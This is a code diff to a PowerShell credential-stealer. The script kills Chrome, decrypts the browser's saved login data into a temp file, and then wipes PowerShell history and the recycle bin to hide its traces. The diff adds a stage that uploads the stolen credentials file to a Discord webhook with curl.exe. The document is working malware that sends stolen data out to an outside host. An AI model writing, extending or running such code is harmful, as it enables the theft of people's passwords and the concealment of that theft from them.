@@ -7,8 +7,6 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 #First we Kill Chrome just to be safe
 Stop-Process -Name Chrome
 
-######################################################################################################################
-
 $d=Add-Type -A System.Security
 $p='public static'
 $g=""")]$p extern"
@@ -32,14 +30,33 @@ $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_
 
 echo $l >> $env:TMP\$FileName
 
-#Start Chrome again
+######################################################################################################################
+#Stage 2 Upload to discord
 
-$pathToChrome = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
-Start-Process -FilePath $pathToChrome
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP\$FileName"}
+
 
 ######################################################################################################################
 
-#Stage 2 Cleanup Traces
+#Stage 3 Cleanup Traces
 
 <#
 .NOTES 
@@ -62,4 +79,4 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
-exit
+Exit
